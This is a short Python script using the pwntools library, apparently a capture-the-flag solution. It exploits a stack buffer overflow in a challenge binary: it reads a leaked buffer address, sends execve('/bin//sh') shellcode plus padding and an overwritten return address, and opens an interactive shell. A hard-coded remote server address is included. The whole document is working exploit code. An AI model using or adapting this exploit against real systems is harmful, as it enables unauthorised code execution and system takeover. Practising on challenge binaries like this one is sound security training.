from pwn import *

isremote = False
if isremote:
    r = remote("107.167.182.200", 20003)
else:
    r = process("./src/chal")
context.arch = 'amd64'

buffer_address = int(r.recvline().split()[2], 16)
r.recvline()
raw_input('>')
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
print(len(shellcode))
print(hex(buffer_address))
r.sendline(shellcode+'a'*97+p64(buffer_address)) # offset = 120 - len(shellcode)

r.interactive()


